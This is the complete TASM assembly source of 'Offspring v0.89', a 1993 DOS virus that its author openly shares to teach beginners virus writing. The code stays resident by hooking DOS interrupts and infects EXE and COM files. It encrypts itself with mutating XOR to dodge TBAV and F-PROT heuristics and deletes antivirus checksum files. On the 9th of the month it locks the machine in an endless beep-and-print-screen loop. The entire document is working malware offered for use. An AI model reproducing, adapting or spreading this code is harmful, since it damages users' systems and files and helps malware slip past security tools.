;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; ************************************************
;     OFFSPRING v0.89 - BY VIROGEN - 10-03-93
; ************************************************
;  - Compatible with : TASM /m2
;
;
; .. Welcome to another virogen viral creation! I'm supplying this source
; code so hopefully beginners in the art of virus writing can learn something
; from it.  Please don't hack up this code and put your name on it.. thank
; ya, thank ya very much!   Oh yea, one more thing.. say whoever gave Mcafee
; a real OLD version of this virus, just keep giving him that same one eh?
;
;  TYPE : Parastic & Spawning Resident Encrypting (PSRhA)
;
;
;  VERSION : 0.89
;            - No longer detectable by TBAV heuristics.
;            - No longer detectable by FPROT heuristics.
;            - Infects on dir and drive change when no program running.
;              deletes ANTI-VIR.DAT and CHKLST.* files at the same time.
;            - finally went through and somewhat cleaned up the messy code
;              at least a little bit.
;            - mutation is improved
;
;
	    title   offspring_1
cseg	    segment
	    assume  cs: cseg, ds: cseg, ss: cseg, es: cseg

signal	    equ	    7dh			    ; Installation check
reply	    equ	    0fch		    ; reply to check

max_inf     equ     05                      ; Maximum files to infect per run
max_rotation equ    9                       ; number of bytes in switch byte table
parastic    equ	    01			    ; Parastic infection
spawn	    equ	    00			    ; Spawning infection

	    org	    100h		    ; Leave room for PSP

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�-
; Start of viral code
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

start:

new_code    db      0B8h                    ; MOV NN,xxxx
            dw      main                    ; main
push_reg    db      50h                     ; PUSH NN
            db      0C3h                    ; RET - jump to NN
            db      0E9h                    ; id byte - not code
trick_jmp   db      0E9h                    ; fake jump - f00l tbav
            dw      5999                    ; random number 0-5999

;컴컴컴컴컴컴컴컴컴컴컴컴-
; Encryption/Decryption
;컴컴컴컴컴컴컴컴컴컴컴컴-
_enc:
            di_op   db 0bfh                 ; MOV DI|SI,XXXX
            mov_di  dw offset enc_data     ; Point to byte after encryption num
encrypt:
cx_m        db      90h,0b9h                ; MOV CX
b_wr        dw      (offset vend-offset enc_data)/2
xor_loop:
xor_op:     xor word ptr [di],0666h ; Xor each word - number changes accordingly
fill_space: inc ax                  ; This is filled with INC XX's
            inc ax                  ; kill F-PROT heuristic detection
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
            inc ax                  ;
 sw_byte3:                        ; INC SI|DI changes position in these bytes
            inc     di                      ; INC SI|DI
            inc     ax                      ; INC xx
            inc     ax                      ; INC xx
sw_byte4:
            inc     di                      ; INC SI|DI
            inc     ax                      ; INC xx
            inc     ax                      ; INX xx
            loop    xor_loop                ; loop while cx != 0

ret_byte    db     90h                      ; Changes to RET (0C3h) - then back to NOP

enc_data:   	    			    ; Start of encrypted data

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  Non-Resident portion of virus
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
main	    proc

            db      0bdh                    ; MOV BP,xxxx - Load delta offset
set_bp:     dw      0000

	    mov	    ax,ds: 002ch	    ; Get environment address
            mov     par_blk[bp],ax          ; Save in parameter block for exec

            mov     par1[bp],cs             ; Save segments for spawn
            mov     par2[bp],cs
            mov     par_seg[bp],cs

	    mov	    ah,2ah		    ; Get date
	    int	    21h

	    cmp	    dl,9		    ; 9th?
            jne     no_display

 show_myself:
            mov     ah,09                   ; display virus name
            lea     dx,v_id[bp]
	    int	    21h

	    xor	    ax,ax		    ; seg 0
	    mov	    es,ax
	    mov	    dx,1010101010101010b    ; lights
 chg_lights:                                ; Infinite loop to change keyboard
	    mov	    word ptr es: [416h],dx  ; 0040:0016h = keyb flags
	    ror	    dx,1		    ; rotate bits
	    mov	    cx,0101h		    ; scan code/ascii
	    mov	    ah,05h		    ; push a beep onto keyb buf
	    int	    16h
	    mov	    ah,10h		    ; Read key back so we don't fill
	    int	    16h			    ; up the keyboard buffer
	    int	    5h			    ; Print-Screen
	    mov	    ax,0a07h		    ; Write BEEP to screen
	    xor	    bh,bh
	    mov	    cx,1
	    int	    10h
	    mov	    ah,86h		    ; Delay
	    mov	    cx,0002h
	    int	    15h

	    jmp	    chg_lights

 no_display:

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; INSTALL - Install the virus in memory

            mov     ah,signal              ; is virus already in mem?
            int     21h
            cmp     ah,reply               ;
            jne     cont_i                 ; nope.. continue
            jmp     no_install             ; yes.. don't install again
 cont_i:

            mov     ax,cs
            dec     ax
            mov     ds,ax
            cmp     byte ptr ds: [0],'Z'    ;Is this the last MCB in
                                            ;the chain?
            je      cont_i2
            jmp     no_install
 cont_i2:


            mov     ax,ds: [3]              ;Block size in MCB
            sub     ax,230                  ;Shrink Block Size-quick estimate
            mov     ds: [3],ax

            mov     bx,ax
            mov     ax,es
            add     ax,bx
            mov     es,ax                   ;Find high memory seg

            mov     si,bp
            add     si,0100h
            mov     cx,(offset vend - offset start)
            mov     ax,ds
            inc     ax
            mov     ds,ax
            mov     di,100h                 ; New location in high memory
            cld
            rep     movsb                   ; Copy virus to high memory

            push    es
            pop     ds
            xor     ax,ax
            mov     es,ax                   ; null es
            mov     ax,es: [21h*4+2]        ; store old int addresses
            mov     bx,es: [21h*4]
            mov     ds: old21_seg,ax
            mov     ds: old21_ofs,bx
            mov     ax, es: [20h*4+2]
            mov     bx, es:[20h*4]
            mov     ds: old_20_seg,ax
            mov     ds: old_20_ofs,bx
            mov     ax, es:[27h*4+2]
            mov     bx, es:[27h*4]
            mov     ds: old_27_seg,ax
            mov     ds: old_27_ofs,bx

            cli                             ; disable interrrupts

            mov     es: [21h*4+2],ds        ; Set new addresses
            lea     ax, new21
            mov     es: [21h*4],ax

            mov     es: [20h*4+2],ds
            lea     ax, new20
            mov     es: [20h*4],ax

            mov     es: [27h*4+2],ds
            lea     ax, new27
            mov     es: [27h*4],ax

            sti                             ; re-enable interrupts

 no_install:
            push    cs                      ; Restore segment regs
            pop     ds
            push    cs
            pop     es

            cmp     byte ptr vtype[bp],parastic ; parastic infection?
            je      com_return              ; yes, return to start of COM

            mov     bx,(offset vend+50)     ; Calculate memory needed
	    mov	    cl,4		    ; divide by 16
            shr     bx,cl
            inc     bx
            mov     ah,4ah
	    int	    21h			    ; Release un-needed memory

	    lea	    dx,file_dir-1[bp]	    ; Execute the original EXE
	    lea	    bx,par_blk[bp]
            mov     ch,0FBh                 ; tell mem. resident virus
            mov     ax,4b00h                ; that it's us.
	    int	    21h

	    mov	    ah,4ch		    ; Exit
	    int	    21h

 com_return:

            inc    dir_infect

            mov     si,bp                   ;
            mov     cx,7                    ; Restore original first
            add     si,offset org_bytes     ; seven bytes of COM file
            mov     di,0100h                ;
            cld                             ;
            rep     movsb                   ;

            mov     ax,0100h                ; Jump back to 100h - start of
            push    ax                      ; original program
            ret                             ;

main	    endp


;************************************************************************
; Interrupt handlers
;************************************************************************
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; INT 27h  - terminate stay resident
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
new27    proc
         dec byte ptr cs:[dir_infect]   ; decrement running counter
         db 0EAh                        ; Jump to original offset, seg
    old_27_ofs dw 0
    old_27_seg dw 0
 new27    endp

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�-
; INT 20h  - terminate process
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
new20     proc
          dec byte ptr cs:[dir_infect]  ; decrement running counter
          db 0EAh                       ; Jump to original offset, seg
    old_20_ofs  dw   0
    old_20_seg  dw   0
new20       endp
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; INT 24h - Critical Error Handler
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
eh        proc
          mov al,3              ; fail call
          iret                  ; interrupt return
eh        endp
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; INT 21h - DOS function calls
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

new21	    proc    			    ; New INT 21H handler

	    cmp	    ah, signal		    ; signaling us?
	    jne	    no
	    mov	    ah,reply		    ; yep, give our offspring what he wants
	    jmp	    end_21
 no:
            cmp     ax,4b00h                ; exec func?
            jne     check_other
            inc     byte ptr cs:[dir_infect]
            jmp     exec_func

 check_other:
            cmp     ah,3Bh                  ; change directory?
            je      kill_func               ; yes, kill CHKLIST.* files
            cmp     ah,0Eh                  ; change drive?
            je      kill_func               ; yes, kill CHKLIST.* files
            cmp     ah,4ch                  ; terminate process?
            je      dec_counter             ; yes, decrement running counter
            cmp     ah,31h                  ; tsr?
            je      dec_counter             ; yes, decrement running counter
            cmp     ah,00h                  ; terminate process?
            je      dec_counter             ; yes, decrement running counter

            jmp     end_21                  ; return to original INT 21h

  kill_func:
            mov byte ptr cs:[kill_now],1    ; remember it's time to kill CRC
  exec_func:
            cmp     ch,0FBh                 ; Is our virus executing this prog?
            je      end_21                  ; yes, return to orginal INT 21h
  run_res:
            pushf                           ; Push flags
            push    ax                      ; Push regs
	    push    bx
	    push    cx
	    push    dx
	    push    di
            push    si
            push    bp
	    push    ds
	    push    es
	    push    sp
	    push    ss

            push    cs                      ; ds=cs
	    pop	    ds

            
            xor     ax,ax                   ; nullify ES
	    mov	    es,ax


            cmp     byte ptr add_mem,1      ; Restore system conventional mem size?
            je      rel_mem                 ; yes, back to 640k
            cmp     ah,48h                  ; alloc. mem block? If so we subtract 4k from
	    je	    set_mem		    ; total system memory.

            jmp     no_mem_func             ; don't f00l with memory now

  set_mem:
            sub     word ptr es: [413h],4   ; Subtract 4k from total sys mem
	    inc	    byte ptr add_mem	    ; make sure we know to add this back
	    jmp	    no_mem_func
  rel_mem:
            add     word ptr es: [413h],4   ; Add 4k to total sys mem
            dec     byte ptr add_mem


  no_mem_func:
            mov     ah,2fh                  ; Get DTA Address
            int     21h                     ;

            mov     ax,es                   ; Save it so we can restore it
            mov     word ptr old_dta,bx
            mov     word ptr old_dta+2,ax
            push    cs                      ; es=cs
            pop     es

	    call    resident		    ; Call infection kernal

            mov     dx,word ptr old_dta     ; restore DTA
            mov     ax,word ptr old_dta+2   ;
            mov     ds,ax                   ;
            mov     ah,1ah                  ;
            int     21h                     ;

            pop     ss                      ; Pop regs
	    pop	    sp
	    pop	    es
	    pop	    ds
	    pop	    bp
            pop     si
            pop     di
	    pop	    dx
	    pop	    cx
	    pop	    bx
	    pop	    ax
            popf                            ; Pop flags
 end_21  :
	    db	    0eah		    ; jump to original int 21h
old21_ofs   dw	    0			    ; Offset of old INT 21H
old21_seg   dw	    0			    ; Seg of old INT 21h

dec_counter:
            dec   byte ptr cs:[dir_infect]  ; decrement running counter
            jmp   end_21

new21       endp                            ; End of handler

;컴컴컴컴컴컴컴컴컴컴컴컴컴
; Clear ff/fn buf
;컴컴컴컴컴컴컴컴컴컴컴컴컴
clear_buf   proc
            mov     word ptr fcb,0         ; Clear ff/fn buffer
            lea     si, fcb
            lea     di, fcb+2
            mov     cx, 22
            cld
            rep     movsw
            ret
clear_buf   endp

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴
; Resident - This is called from out INT 21h handler
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴
resident    proc

            xor     ax,ax                       ; es=segment 0
            mov     es,ax                       ; ..
            mov     ax,es:[24h*4+2]             ; get segment of INT 24h
            mov     bx,es:[24h*4]               ; get offset of INT 24h
            mov     old_eh_seg,ax               ; save segment
            mov     old_eh_off,bx               ; save offset
            cli                                 ; turn off interrupts
            mov     es:[24h*4+2],ds             ; set segment to our handler
            lea     ax,eh                       ;
            mov     es:[24h*4],ax               ; set offset to our handler
            sti

            push ds                             ; es=ds
            pop  es

                                                ; Set DTA address - This is for the                                                Findfirst/Findnext INT 21H functions
            mov     ah, 1ah
            lea     dx, fcb
            int     21h

            mov     byte ptr vtype,spawn       ; infection type = spawning
            mov     word ptr set_bp,0000       ; BP=0000 on load
            mov     byte ptr inf_count,0       ; null infection count
            mov     fname_off, offset fname1   ; Set search for *.EXE
            mov     word ptr mov_di,offset enc_data ; offset past encrypt.


            cmp byte ptr kill_now, 1    ; change dir, or change drive func?
            jne     no_kill             ; nope.. forget this shit
            cmp     dir_infect,0        ; are we running a program right now?
            je      cont_res            ; nope.. keep going
            jmp     fd2                 ; yes.. don't infect this time
 cont_res:
       ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
       ; KIll chklist.* (MSAV,CPAV) and anti-vir.dat (TBAV) files
       ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�-
           
            mov     chk_spec_addr, offset chk_spec  ; kill CHKLIST.* first
            xor     cx,cx                ; keep track of which we've killed
 kill_another_spec:
            push    cx

            call    clear_buf            ; clear FCB

            mov     ah, 4eh             ; Findfirst
            xor     cx, cx              ; Set normal file attribute search
            mov     dx, chk_spec_addr
            int     21h

            jc      done_kill           ; none found.. done
 kill_loop:
            mov     ax,4301h            ; Set file attributes to null
            xor     cx,cx               ;
            lea     dx,f_name           ;
            int     21h                 ;

            mov     ah,3ch              ; create file = nullify size
            xor     cx,cx               ;
            lea     dx,f_name           ;
            int     21h                 ;

            push    ax                  ; get handle
            pop     bx                  ;

            mov     ah,3eh              ; close file
            int     21h                 ;

            mov     ah,41h              ; delete the file to finish 'er off
            lea     dx,f_name           ;
            int     21h                 ;

             mov     ah,4fh             ; find next file
             int     21h                ;
             jnc     kill_loop          ; if more then kill 'em

 done_kill:
             pop   cx                   ; restore spec counter
             inc   cx                   ; increment spec counter
             mov   chk_spec_addr,offset chk_spec2 ; new file spec to kill
             cmp   cx,2                 ; have we already killed both?
             jne   kill_another_spec    ; nope.. kell 'em

 no_kill:
            mov     kill_now,0          ; we killed them this time
          ;컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

 find_first:
            call    clear_buf            ; clear FCB again

            mov     ah, 4eh              ; Findfirst
            xor     cx, cx               ; Set normal file attribute search
            mov     dx, fname_off
	    int	    21h

            jnc     next_loop            ; if still finding files then loop
            jmp     end_prog             ; if not.. then end this infection

 next_loop :
            cmp     byte ptr vtype, parastic ; parastic infection?
            je      start_inf                ; yes, skip all this

            mov     ah,47h                   ; get directory for
            xor     dl,dl                    ; ..spawning infections
            lea     si,file_dir              ;
            int     21h                      ;

           cmp     word ptr f_sizel,0 ; Make sure file isn't 64k+
           je      ok_find                   ; for spawning infections
           jmp     find_file

 ok_find:
            xor     bx,bx                    ;
            lm3     :                        ; find end of directory name
            inc     bx                       ;
	    cmp	    file_dir[bx],0
	    jne	    lm3

	    mov	    file_dir[bx],'\'	    ; append backslash to path
	    inc	    bx

	    mov	    cx,13		    ; append filename to path
            lea     si,f_name
	    lea	    di,file_dir[bx]
	    cld
	    rep	    movsb

            xor     bx,bx
 loop_me:                                   ; search for filename ext.
	    inc	    bx
            cmp     byte ptr fcb+1eh [bx], '.'
	    jne	    loop_me

	    inc	    bx			    ; change it to COM
            mov     word ptr fcb+1eh [bx],'OC'
            mov     byte ptr fcb+1eh [bx+2],'M'


 start_inf:

            ;컴컴컴컴컴
            ; Change jump & fill space register
            ;컴컴컴컴컴
            cmp     byte ptr new_code, 0BFh
            jne     inc_jmp
            mov     byte ptr new_code, 0B7h
            mov     byte ptr push_reg, 04Fh
            mov     nop_sub, 3Fh
inc_jmp:
            inc     byte ptr new_code      ; incrment register
            inc     byte ptr push_reg      ; increment register
            mov     dh,nop_sub             ; get old register to inc/dec
            mov     old_nop_sub,dh         ; save it.. to be used later
            inc     nop_sub                ; increment register
            jmp     ok_jmp_changed
 ok_jmp_changed:

            cmp     byte ptr vtype, parastic ; parastic infection?
	    je	    parastic_inf	    ; yes.. so jump

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�-
; Spawning infection

            mov     word ptr new_code+1,offset _enc

            lea     dx,f_name
            mov     cx, 02h              ; read-only
            or      cx, 01h              ; hidden
            mov     ah, 3ch              ; Create file
            int     21h                  ; Call INT 21H
            jnc     contin               ; If Error-probably already infected
            jmp     no_infect
 contin:
	    inc	    inf_count
	    mov	    bx,ax

	    jmp	    encrypt_ops
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�-
; Parastic infection

 parastic_inf :

            lea     si,f_name          ; Is Command.COM?
	    lea	    di,com_name
	    mov	    cx,11
	    cld
	    repe    cmpsb

	    jne	    cont_inf0		    ; Yes, don't infect
            jmp     no_infect

 cont_inf0:

            mov     ax,3d02h               ; Open file for reading & writing
            lea     dx,f_name              ; Filename in FF/FN buffer
	    int	    21h

            jnc     cont_inf1              ; error, skip infection
	    jmp	    no_infect

 cont_inf1:


           mov     bx,ax                   ; get handle

            mov     ah,3fh                  ; Read first bytes of file
            mov     cx,07
            lea     dx,org_bytes
            int     21h

            cmp     byte ptr org_bytes+6,0E9h ; already infected?
            jne     cont_inf                ; nope let's infect this sucker

            mov     ah,3eh
            int     21h
            jmp     no_infect

 cont_inf:
            inc     inf_count
	    mov	    ax,4202h		    ; Set pointer to end of file, so we
	    xor	    cx,cx		    ; can find the file size
	    xor	    dx,dx
	    int	    21h

	    mov	    word ptr set_bp,ax	    ; Change the MOV BP inst.
            add     ax, offset enc_data
	    mov	    word ptr mov_di,ax	    ; chg mov di,xxxx

            mov     ax,4200h                ; set file pointer to beginning
	    xor	    cx,cx
	    xor	    dx,dx
	    int	    21h

            mov     ax,word ptr f_sizeh      ; save new address for parastic
            add     ax,offset _enc           ;
            mov     word ptr new_code+1,ax   ;

            mov     ah,40h                   ; write new first 7 bytes
            mov     cx,7                     ; .. jumps to virus code
            lea     dx,new_code              ;
            int     21h                      ;

            mov     ax,4202h                 ; Set file pointer to end of file
            xor     cx,cx                    ;
            xor     dx,dx                    ;
	    int	    21h

encrypt_ops:

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴-
; Change encryptions ops

            push    bx                      ; save file handle

            cmp     pad_bytes,50            ; no more increase in file size?
            je      reset_pad               ; if yes, reset
	    inc	    word ptr pad_bytes	    ; Increase file size
            inc     word ptr b_wr           ; make note of the increase
            jmp     pad_ok                  ; don't reset pad
 reset_pad:
            mov     word ptr pad_bytes,0    ; reset pad size
            sub     word ptr b_wr,50        ; make note of decrease

 pad_ok:

	    cmp	    inc_op,47h		    ; change ops from DI to SI
	    jne	    set2
	    dec	    inc_op
	    dec	    byte ptr xor_op+1
	    dec	    di_op
	    dec	    byte ptr enc_addr
	    dec	    byte ptr enc_add+1
	    jmp	    chg_three
 set2:
	    inc	    inc_op
	    inc	    byte ptr xor_op+1
	    inc	    di_op
	    inc	    byte ptr enc_addr
	    inc	    byte ptr enc_add+1

 chg_three:
            mov     dh,byte ptr nop_sub   ; which byte did we use to fill space?
            cmp     dh,48h                ; if INC AX then we need to reset it
            jne     _change               ; else decrement it
            mov     dh,40h                ; reset to DEC AX
 _change:
            cmp     dh,41h                ; Don't use INC CX..
            jne     no_conflict           ;
            mov     dh,48h                ; Change it to DEC AX instead
 no_conflict:
            cmp     dh,47h                ; Don't use INC DI
            jne     no_conflict2          ;
            mov     dh,4Bh                ; Use DEC BX Instead
 no_conflict2:
            cmp     dh,44h                ; Don't use INC SP
            jne     no_conflict3          ;
            mov     dh,4Dh                ; Use DEC BP Instead
 no_conflict3:
            cmp     dh,46h                ; Don't use INC SI
            jne     no_conflict4
            mov     dh,0FBh               ; Use STI instead
 no_conflict4:
            mov     dl,dh                 ; mov into word reg dx

            mov     cx,16                 ; 32 bytes
            lea     si,fill_space         ; beginning of null space
 fill_loop:
            mov     [si],dx               ; fill null bytes with same op
            inc     si                    ;
            inc     si                    ;
            loop fill_loop                ;

            xor     cx,cx                 ; keep track of which we're changing
            lea     di,sw_byte3           ; change the first INC location
  change_pos_ag:
            inc     cx                    ; make note
            cmp     change_num,3          ; last position?
            jne     cont_change           ; nope.. go ahead
            mov     change_num,0          ; else.. reset it
  cont_change:
            add     di,change_num         ; location to put INC
            mov     ah,inc_op             ; INC DI|SI
            mov     byte ptr [di],ah      ; write new INC SI|DI

            lea     di,sw_byte4           ; now change second INC SI|DI
            cmp     cx,2                  ; did we already change both?
            jne     change_pos_ag         ; no, change the second
            inc     change_num            ; increment position

            mov     ah,dir_infect         ; save dir_infect
            push    ax                    ;
            mov     dir_infect,1          ; and reset it to 1
;컴컴컴컴컴컴컴컴컴컴컴-
; Get random XOR number, save it, copy virus, encrypt code

 d2:

            mov     ah,2ch              ;
            int     21h                 ; Get random number from clock - sec/ms

	    mov	    word ptr xor_op+2,dx    ; save encryption #
            mov     word ptr trick_jmp+1,dx ; put same number in fake jump

	    mov	    si,0100h
            lea     di,vend+50              ; destination
	    mov	    cx,offset vend-100h	    ; bytes to move
	    cld
	    rep	    movsb		    ; copy virus outside of code

 enc_addr:
	    mov	    di,offset vend
 enc_add:
            add     di,offset enc_data-100h+50 ; offset of new copy of virus

 go_enc:
            mov     byte ptr ret_byte,0c3h  ; make encryption routine RET
            call    encrypt                 ; encrypt new copy of virus
            mov     byte ptr ret_byte,90h   ; Reset it to no RETurn

            pop    ax                       ; restore dir_infect
            mov    dir_infect,ah
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�-
; Write and close new infected file

	    pop	    bx
	    mov	    cx, offset vend-100h    ; # of bytes to write
	    add	    cx, pad_bytes
            lea     dx, vend+50             ; Offset of buffer
	    mov	    ah, 40h		    ; -- our program in memory
	    int	    21h			    ; Call INT 21H function 40h

	    mov	    ax,5701h		    ; Restore data/time
            mov     cx,word ptr f_time
            mov     dx,word ptr f_date
	    int	    21h


 close:
            mov     ah, 3eh                 ; close file
	    int	    21h


 no_infect:
 find_file:

            cmp     inf_count, max_inf   ; Max files found?
            je      end_prog             ; yes, end infection
            mov     ah,4fh               ; Find next file
	    int	    21h
            jc      end_prog             ; if no files found.. quit
            jmp     next_loop            ; infect the next file


 end_prog:
 exit    :
            cmp     inf_count,0             ; Start parastic infection on next run
            jne     find_done               ; nope.. we're done
            cmp     byte ptr vtype, parastic ; Parastic infection done?
            je      find_done                ; yep, exit already
	    mov	    fname_off, offset fname2 ; Point to new filespec
	    mov	    byte ptr vtype, parastic ; virus type = parastic
            jmp     find_first               ; do it again for parastic


 find_done:
 fd2:
            xor    ax,ax
            mov    es,ax                ; es = 0
            cli                         ; interrupts off
            mov     ax,old_eh_seg       ; get old int 24h segment
            mov     bx,old_eh_off       ; get old int 24h offset
            mov     es:[24h*4+2],ax     ; restore int 24h segment
            mov     es:[24h*4],bx       ; restore int 24h offsetn
            sti                         ; interrupts on
            ret                         ; return
resident    endp




vtype	    db	    spawn		    ; Infection type
com_name    db	    'COMMAND.COM'	    ; obvious
org_bytes   db      7 dup(0)                ; original first seven bytes of parastic inf.
pad_bytes   dw      0                       ; Increase in virus size
add_mem	    db	    0			    ; Add memory back?
inc_op      db      47h                     ; INC DI (47h) or INC SI (46h)
nop_sub     db      40h                     ; fill byte
copyr       db      28h,63h,29h,20h,0FBh,69h,72h,6Fh,67h,65h,6Eh
v_id        db      0ah,0dh,'O윜spring Virus V0.89','$'
kill_now    db      0                       ; no program running? dir/disk call?
chk_spec    db      'CHKLIST.*',0           ; MS/CPAV Checksom kill
chk_spec2   db      'ANTI-VIR.DAT',0        ; TBAV Checksum kill
fname1      db      '*.EXE',0               ; Filespec
fname2	    db	    '*.COM',0		    ; Filespec
change_num  dw      0                       ; keep track of position of INC DI|SI
times_inc   db      0                       ; # of times encryption call incremented
sl	    db	    '\'			    ; Backslash for directory name
file_dir    db	    64 dup(0)		    ; directory of file we infected
file_name   db	    13 dup(0)		    ; filename of file we infected

par_blk	    dw	    0			    ; command line count byte   -psp
par_cmd	    dw	    0080h		    ; Point to the command line -psp
par_seg	    dw	    0			    ; seg
	    dw	    05ch		    ; Use default FCB's in psp to save space
par1	    dw	    0			    ;        
	    dw	    06ch		    ; FCB #2
par2	    dw	    0			    ;

dir_infect  db      0

vend:                                       ; End of virus

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; heap - not written to disk
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
chk_spec_addr dw    chk_spec                ; delete file spec
fname_off   dw      fname1                  ; Offset of Filespec to use
old_nop_sub db      0
old_dta     dd      0                       ; Old DTA Segment:Address
old_eh_seg  dw      0                       ; old error handler (int 24h) seg
old_eh_off  dw      0                       ; old error handler (int 24h) ofs
inf_count   db      0                       ; How many files we have infected this run
fcb         db      21 dup(0)               ; fcb
  attrib    db      0                        ; file attribute
  f_time    dw      0                        ; file time
  f_date    dw      0                        ; file date
  f_sizeh   dw      0                        ; file size
  f_sizel   dw      0                        ;
  f_name    db      13 dup(0)                ; file name


cseg        ends
	    end	    start
